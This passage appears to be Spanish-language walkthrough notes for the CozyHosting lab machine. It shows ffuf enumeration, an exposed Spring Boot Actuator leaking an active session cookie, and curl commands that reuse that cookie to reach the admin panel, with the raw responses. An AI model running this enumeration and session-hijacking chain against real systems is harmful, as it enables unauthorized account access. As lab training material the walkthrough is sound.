ffuf -u http://cozyhosting.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -mc all -fc 404

## Comprobaciones

Debe comprobarse si /admin existe y si redirige a /login, devuelve 401/403 o muestra contenido.

Debe comprobarse si /logout existe, porque puede confirmar que el backend usa sesiones.

Debe comprobarse si /actuator existe.

Debe comprobarse si algún endpoint de actuator devuelve información sin autenticación.

Debe comprobarse si /actuator/mappings revela rutas internas de la aplicación.

Debe comprobarse si /actuator/sessions expone sesiones activas.

Debe comprobarse si las respuestas 401, 403, 302, 500 y 200 indican zonas reales aunque no estén accesibles todavía.

Debe comprobarse si aparece una cookie tipo JSESSIONID u otra cookie de sesión al interactuar con /login o /admin.

## Notas para el informe

La revisión de /login confirma que CozyHosting no es solo una landing estática. Existe un flujo de autenticación real con POST a /login y campos username, password y remember.

La ruta /error y las rutas inexistentes devuelven JSON estructurado, lo que indica una aplicación backend detrás de nginx.

La plantilla NiceAdmin afecta al aspecto visual del login, pero no debe confundirse con el backend ni con una vulnerabilidad.

El punto metodológico importante es no atacar el formulario de login sin contexto. La mejor siguiente verificación es enumerar rutas de backend y diagnóstico.

Hallazgo dominante actual:

landing pública
→ /login real
→ errores JSON de backend
→ posible aplicación Java/Spring
→ búsqueda dirigida de rutas backend

Rama principal activa:

WEB-BASE

Rama probable siguiente:

WEB-AUTH / PANEL si /admin, sesión o endpoints autenticados quedan confirmados

Rama secundaria:

SSH pendiente de credenciales

Siguiente paso único:

enumerar /admin, /logout y endpoints /actuator para identificar superficie backend real.

## Ejecutamos:

HTTP/1.1 401
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Set-Cookie: JSESSIONID=7973024D4ACF933A79FFF0AC267E833A; Path=/; HttpOnly
WWW-Authenticate: Basic realm="Realm"
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"timestamp":"2026-05-02T11:44:50.286+00:00","status":401,"error":"Unauthorized","path":"/admin"}HTTP/1.1 204
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"_links":{"self":{"href":"http://localhost:8080/actuator","templated":false},"sessions":{"href":"http://localhost:8080/actuator/sessions","templated":false},"beans":{"href":"http://localhost:8080/actuator/beans","templated":false},"health-path":{"href":"http://localhost:8080/actuator/health/{*path}","templated":true},"health":{"href":"http://localhost:8080/actuator/health","templated":false},"env":{"href":"http://localhost:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://localhost:8080/actuator/env/{toMatch}","templated":true},"mappings":{"href":"http://localhost:8080/actuator/mappings","templated":false}}}HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"status":"UP"}HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"contexts":{"application":{"mappings":{"dispatcherServlets":{"dispatcherServlet":[{"handler":"Actuator web endpoint 'health'","predicate":"{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/health"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'health-path'","predicate":"{GET [/actuator/health/**], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/health/**"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'mappings'","predicate":"{GET [/actuator/mappings], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/mappings"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'beans'","predicate":"{GET [/actuator/beans], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/beans"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator root web endpoint","predicate":"{GET [/actuator], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping.WebMvcLinksHandler","name":"links","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Ljava/util/Map;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'env'","predicate":"{GET [/actuator/env], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/env"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'env-toMatch'","predicate":"{GET [/actuator/env/{toMatch}], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/env/{toMatch}"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"Actuator web endpoint 'sessions'","predicate":"{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}","details":{"handlerMethod":{"className":"org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler","name":"handle","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["GET"],"params":[],"patterns":["/actuator/sessions"],"produces":[{"mediaType":"application/vnd.spring-boot.actuator.v3+json","negated":false},{"mediaType":"application/vnd.spring-boot.actuator.v2+json","negated":false},{"mediaType":"application/json","negated":false}]}}},{"handler":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#error(HttpServletRequest)","predicate":"{ [/error]}","details":{"handlerMethod":{"className":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController","name":"error","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;)Lorg/springframework/http/ResponseEntity;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":[],"params":[],"patterns":["/error"],"produces":[]}}},{"handler":"htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)","predicate":"{POST [/executessh]}","details":{"handlerMethod":{"className":"htb.cloudhosting.compliance.ComplianceService","name":"executeOverSsh","descriptor":"(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":["POST"],"params":[],"patterns":["/executessh"],"produces":[]}}},{"handler":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController#errorHtml(HttpServletRequest, HttpServletResponse)","predicate":"{ [/error], produces [text/html]}","details":{"handlerMethod":{"className":"org.springframework.boot.autoconfigure.web.servlet.error.BasicErrorController","name":"errorHtml","descriptor":"(Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)Lorg/springframework/web/servlet/ModelAndView;"},"requestMappingConditions":{"consumes":[],"headers":[],"methods":[],"params":[],"patterns":["/error"],"produces":[{"mediaType":"text/html","negated":false}]}}},{"handler":"ParameterizableViewController [view=\"admin\"]","predicate":"/admin"},{"handler":"ParameterizableViewController [view=\"addhost\"]","predicate":"/addhost"},{"handler":"ParameterizableViewController [view=\"index\"]","predicate":"/index"},{"handler":"ParameterizableViewController [view=\"login\"]","predicate":"/login"},{"handler":"ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]","predicate":"/webjars/**"},{"handler":"ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]","predicate":"/**"}]},"servletFilters":[{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"requestContextFilter","className":"org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter"},{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"Tomcat WebSocket (JSR356) Filter","className":"org.apache.tomcat.websocket.server.WsFilter"},{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"serverHttpObservationFilter","className":"org.springframework.web.filter.ServerHttpObservationFilter"},{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"characterEncodingFilter","className":"org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter"},{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"springSecurityFilterChain","className":"org.springframework.boot.web.servlet.DelegatingFilterProxyRegistrationBean$1"},{"servletNameMappings":[],"urlPatternMappings":["/*"],"name":"formContentFilter","className":"org.springframework.boot.web.servlet.filter.OrderedFormContentFilter"}],"servlets":[{"mappings":["/"],"name":"dispatcherServlet","className":"org.springframework.web.servlet.DispatcherServlet"}]}}}}HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:44:50 GMT
Content-Type: application/vnd.spring-boot.actuator.v3+json
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

{"7973024D4ACF933A79FFF0AC267E833A":"UNAUTHORIZED","69EF63EAAED85BD239B2A03AFE4B7D29":"kanderson"}
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 129ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 130ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 380ms]
login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 403ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 470ms]
render/https://www.google.com [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
:: Progress: [4723/4723] :: Job [1/1] :: 204 req/sec :: Duration: [0:00:19] :: Errors: 0 ::

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 142ms]
actuator/sessions       [Status: 200, Size: 148, Words: 1, Lines: 1, Duration: 111ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 195ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 342ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 207ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 454ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 177ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 346ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 519ms]
:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

## Objetivo

Analizar la enumeración de rutas y endpoints internos de CozyHosting para cerrar la transición desde WEB-BASE hacia WEB-AUTH / PANEL con evidencia técnica suficiente.

## Hechos verificados

La ruta /admin existe, pero sin sesión válida responde con código 401:

HTTP/1.1 401

La respuesta de /admin crea una cookie de sesión nueva:

Set-Cookie: JSESSIONID=7973024D4ACF933A79FFF0AC267E833A; Path=/; HttpOnly

La respuesta de /admin indica autenticación requerida:

WWW-Authenticate: Basic realm="Realm"

El cuerpo de la respuesta confirma acceso no autorizado:

{"timestamp":"2026-05-02T11:44:50.286+00:00","status":401,"error":"Unauthorized","path":"/admin"}

La ruta /logout existe y responde con código 204:

HTTP/1.1 204

El endpoint /actuator está expuesto sin autenticación y devuelve enlaces internos de Spring Boot Actuator:

/actuator/sessions
/actuator/beans
/actuator/health
/actuator/env
/actuator/mappings

El endpoint /actuator/health confirma que la aplicación está levantada:

{"status":"UP"}

El endpoint /actuator/mappings expone rutas internas de la aplicación.

Entre las rutas internas aparece una acción especialmente relevante:

POST /executessh

El handler asociado a esa ruta es:

htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)

El endpoint /actuator/mappings también confirma vistas internas:

/admin
/addhost
/index
/login

El endpoint /actuator/sessions está expuesto y revela sesiones activas:

{"7973024D4ACF933A79FFF0AC267E833A":"UNAUTHORIZED","69EF63EAAED85BD239B2A03AFE4B7D29":"kanderson"}

La sesión recién creada por el acceso no autorizado aparece como:

7973024D4ACF933A79FFF0AC267E833A : UNAUTHORIZED

Existe otra sesión asociada al usuario:

69EF63EAAED85BD239B2A03AFE4B7D29 : kanderson

El fuzzing con lista común confirma rutas ya observadas:

admin
error
index
login
logout

El fuzzing específico de Spring Boot confirma endpoints Actuator accesibles:

actuator
actuator/sessions
actuator/env
actuator/mappings
actuator/health
actuator/beans

## Supuestos

La aplicación backend queda identificada razonablemente como Spring Boot.

El servicio nginx actúa como frontal, mientras que la aplicación real parece escuchar internamente en localhost:8080, según los enlaces devueltos por /actuator:

http://localhost:8080/actuator

La exposición de Actuator es el hallazgo dominante actual.

La exposición de /actuator/sessions permite reutilizar una sesión válida de otro usuario.

El identificador de sesión útil no es el marcado como UNAUTHORIZED, sino el asociado a kanderson:

69EF63EAAED85BD239B2A03AFE4B7D29

La ruta /admin ya no debe tratarse como simple ruta protegida sin valor. Ahora existe una sesión válida filtrada que puede permitir validar acceso autenticado.

La ruta /executessh no debe explotarse todavía. Primero debe accederse al panel con la sesión válida y entender qué flujo real de la aplicación llama a ese endpoint.

## Método

La lectura correcta de esta fase es:

/admin protegido
→ JSESSIONID creado al acceder sin autorización
→ /actuator expuesto
→ /actuator/mappings revela rutas internas
→ /actuator/sessions filtra sesión válida de kanderson
→ sesión reutilizable probable
→ transición justificada a WEB-AUTH / PANEL

La rama WEB-BASE queda cerrada porque ya no se está simplemente entendiendo la web pública. Ahora existe:

- autenticación real;
- panel protegido;
- sesión válida filtrada;
- endpoint interno sensible;
- aplicación Spring Boot confirmada por Actuator.

El siguiente paso único debe ser validar si la sesión de kanderson permite acceder a /admin.

No se debe saltar directamente a /executessh. La secuencia correcta es:

1. reutilizar la sesión observada;
2. confirmar acceso al panel;
3. identificar qué formulario o acción llama a /executessh;
4. separar interfaz, petición real y backend;
5. interpretar el riesgo del endpoint con evidencia.

## Respuesta

El hallazgo dominante es la exposición de Spring Boot Actuator, especialmente /actuator/sessions.

Este endpoint revela una sesión válida asociada al usuario kanderson. Eso convierte el caso en una rama clara de WEB-AUTH / PANEL, porque ya existe una vía probable para acceder al panel sin conocer credenciales.

La ruta /actuator/mappings añade otra pieza importante: existe un endpoint POST /executessh asociado a una clase llamada ComplianceService y a una función executeOverSsh. Esta información sugiere que la aplicación tiene una funcionalidad interna relacionada con ejecución de SSH o gestión remota de hosts.

La prioridad no es probar /executessh a ciegas. La prioridad es entrar al panel con la sesión de kanderson y observar qué funcionalidad legítima expone la aplicación.

Rama principal activa:

WEB-AUTH / PANEL

Rama secundaria:

SSH pendiente de credenciales

Hallazgo dominante:

Spring Boot Actuator expuesto con filtrado de sesiones

Siguiente paso único:

validar acceso a /admin usando la sesión JSESSIONID asociada a kanderson.

## Comandos

Validar acceso a /admin usando la sesión filtrada de kanderson:

curl -sS -i http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' | head -n 120

Guardar la respuesta completa del panel para análisis:

curl -sS http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -o loot/admin_kanderson.html

Extraer formularios del panel:

grep -Ei 'form|method|action|input|button|textarea|select|hostname|username|executessh|addhost' loot/admin_kanderson.html

Extraer enlaces del panel:

grep -oP 'href="\K[^"]+|src="\K[^"]+' loot/admin_kanderson.html | sort -u

Revisar si aparece el endpoint /executessh dentro del HTML del panel:

grep -i 'executessh' loot/admin_kanderson.html

Revisar si aparece la vista /addhost:

curl -sS -i http://cozyhosting.htb/addhost \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' | head -n 120

## Comprobaciones

Debe comprobarse si la sesión de kanderson permite acceder realmente a /admin.

Debe comprobarse si el panel muestra el usuario autenticado.

Debe comprobarse qué formularios aparecen en el panel.

Debe comprobarse si hay un formulario de alta de host, parcheo, cumplimiento o ejecución remota.

Debe comprobarse si el formulario usa campos como hostname y username.

Debe comprobarse si el formulario llama realmente a /executessh.

Debe comprobarse si /addhost existe como vista útil o si solo aparece en mappings.

Debe comprobarse si la sesión filtrada se mantiene estable o caduca.

Debe comprobarse que la sesión marcada como UNAUTHORIZED no se confunda con la sesión válida de kanderson.

## Notas para el informe

La enumeración dirigida confirma una exposición crítica de Spring Boot Actuator.

El endpoint /actuator no solo revela estado de la aplicación. También enumera endpoints internos y expone sesiones activas.

La sesión válida de kanderson permite plantear una toma de sesión dentro del laboratorio sin conocer la contraseña del usuario.

El endpoint /actuator/mappings revela una funcionalidad interna muy importante: POST /executessh, asociada a ejecución por SSH desde el backend.

La decisión metodológica correcta es pasar de WEB-BASE a WEB-AUTH / PANEL.

El siguiente paso no es explotar el endpoint revelado, sino validar primero el acceso autenticado al panel y observar el flujo legítimo que lo utiliza.

Cadena actual:

web por hostname
→ /login real
→ errores JSON de backend
→ Spring Boot Actuator expuesto
→ /actuator/sessions filtra sesión de kanderson
→ posible acceso a /admin
→ transición a WEB-AUTH / PANEL

Rama principal activa:

WEB-AUTH / PANEL

Siguiente paso único:

validar acceso a /admin con la cookie JSESSIONID de kanderson.

## Ejecutamos:

HTTP/1.1 200
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:47:25 GMT
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0" name="viewport">

    <title>Dashboard - Cozy Cloud</title>

    <link href="assets/img/favicon.png" rel="icon">
    <link href="https://fonts.gstatic.com" rel="preconnect">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
          rel="stylesheet">
    <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
    <link href="assets/css/admin.css" rel="stylesheet">

    <!-- =======================================================
    * Template Name: NiceAdmin
    * Updated: Mar 09 2023 with Bootstrap v5.2.3
    * Template URL: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/
    * Author: BootstrapMade.com
    * License: https://bootstrapmade.com/license/
    ======================================================== -->
</head>

<body>

<header id="header" class="header fixed-top d-flex align-items-center">

    <div class="d-flex align-items-center justify-content-between">
        <a href="index" class="logo d-flex align-items-center">
            <img style="max-height: 80px;" src="assets/img/logo.png" alt="">
            <span class="d-none d-lg-block">Cozy Cloud</span>
        </a>
    </div>

    <nav class="header-nav ms-auto">
        <ul class="d-flex align-items-center">

            <li class="nav-item dropdown">

                <a class="nav-link nav-icon" href="#" data-bs-toggle="dropdown">
                    <i class="bi bi-bell"></i>
                    <span class="badge bg-primary badge-number">1</span>
                </a>

                <ul class="dropdown-menu dropdown-menu-end dropdown-menu-arrow notifications" style="width: 240px;">
                    <li class="notification-item">
                        <i class="bi bi-exclamation-circle text-warning"></i>
                        <div>
                            <h4>Keep your hosts patched!</h4>
                            <p>3 hosts require your attention.</p>
                            <p>30 min. ago</p>
                        </div>
                    </li>
                </ul>
            </li>


            <li class="nav-item dropdown pe-3">
          <span class="nav-link nav-profile d-flex align-items-center pe-0">
            <img src="assets/img/profile-img.jpg" alt="Profile" class="rounded-circle">
            <span class="d-none d-md-block ps-2">K. Anderson</span>
          </span>
            </li>

        </ul>
    </nav>

</header>

<main id="main" class="main" style="margin-left: 0">

    <div class="pagetitle">
        <h1>Admin Dashboard</h1>
    </div>

    <section class="section dashboard">
        <div class="row">

            <div class="col-lg-8">
                <div class="row">
                    <div class="col-12">
                        <div class="card recent-sales overflow-auto">

                            <div class="card-body">
                                <h5 class="card-title">Recent Sales <span>| Today</span></h5>

                                <table class="table table-borderless datatable">
                                    <thead>
                                    <tr>
                                        <th scope="col">#</th>
                                        <th scope="col">Host</th>
                                        <th scope="col">Description</th>
                                        <th scope="col">Cost</th>
                                        <th scope="col">Status</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <tr>
                                        <th scope="row"><a href="#">#2457</a></th>
                                        <td>suspicious mcnulty</td>
                                        <td><a href="#" class="text-primary">Static content</a></td>
                                        <td>$64</td>
                                        <td><span class="badge bg-success">Patched</span></td>
curl: (23) Failed writing body
curl: (23) Failure writing output to destination
grep: loot/admin_kanderson.html: No existe el fichero o el directorio
grep: loot/admin_kanderson.html: No existe el fichero o el directorio
grep: loot/admin_kanderson.html: No existe el fichero o el directorio
HTTP/1.1 500
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 02 May 2026 11:47:25 GMT
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Language: en-US

{"timestamp":"2026-05-02T11:47:25.700+00:00","status":500,"error":"Internal Server Error","path":"/addhost"}

## Objetivo

Analizar la validación de acceso autenticado al panel de CozyHosting con la sesión filtrada de kanderson y decidir el siguiente paso único dentro de la rama WEB-AUTH / PANEL.

## Hechos verificados

La cookie de sesión asociada a kanderson permite acceder correctamente a /admin.

La respuesta de /admin devuelve código HTTP 200:

HTTP/1.1 200

El título de la página autenticada es:

Dashboard - Cozy Cloud

El panel muestra una identidad autenticada visible:

K. Anderson

El panel contiene una sección de administración:

Admin Dashboard

La página muestra información de hosts y estado de parcheo, por ejemplo:

Keep your hosts patched!
3 hosts require your attention.

La sesión reutilizada no es una sesión anónima ni no autorizada. La sesión proporciona acceso real al dashboard.

El error de curl:

curl: (23) Failed writing body
curl: (23) Failure writing output to destination

no indica un fallo del objetivo. Se produce porque la salida de curl se corta con head y curl intenta seguir escribiendo cuando la tubería ya se ha cerrado.

Los comandos grep fallaron porque el fichero local no existe:

loot/admin_kanderson.html: No existe el fichero o el directorio

Esto indica un problema local de guardado o de directorio, no un problema de acceso al panel.

La ruta /addhost existe en los mappings, pero al acceder directamente por GET devuelve error 500:

HTTP/1.1 500
Internal Server Error

El error en /addhost no descarta la funcionalidad. Puede ser una vista que requiera contexto interno o una ruta no pensada para acceso directo.

## Supuestos

El acceso autenticado al panel queda confirmado.

La rama WEB-AUTH / PANEL ya es la rama principal activa.

El panel probablemente contiene más contenido por debajo de las primeras 120 líneas mostradas.

El formulario o acción relevante no ha sido visto todavía porque la salida se cortó antes de llegar al final del HTML.

El fallo de los grep se debe probablemente a que no existe el directorio loot en la ubicación actual o a que el fichero no llegó a guardarse.

La vista /addhost no debe priorizarse ahora. La prioridad es guardar correctamente el HTML completo de /admin e inspeccionar sus formularios.

## Método

La lectura correcta de esta fase es:

sesión kanderson filtrada
→ acceso a /admin confirmado
→ identidad K. Anderson visible
→ panel autenticado real
→ /addhost por GET devuelve 500
→ falta inspeccionar HTML completo del panel
→ siguiente paso único: guardar e inspeccionar /admin correctamente

No conviene sacar conclusiones con una respuesta cortada por head.

No conviene interpretar los errores locales de grep como fallos de la aplicación.

No conviene usar /addhost como vía principal mientras no se entienda qué formulario o flujo del panel llama realmente a esa funcionalidad.

## Respuesta

El hallazgo dominante ahora es el acceso autenticado real al panel como K. Anderson mediante reutilización de la sesión expuesta por Actuator.

Esto cierra la transición desde WEB-BASE hacia WEB-AUTH / PANEL.

El siguiente paso correcto es guardar el HTML completo del panel y localizar formularios, endpoints, campos y botones. En particular, interesa identificar si existe una acción relacionada con gestión de hosts, parcheo automático o ejecución SSH.

La rama principal activa queda fijada como:

WEB-AUTH / PANEL

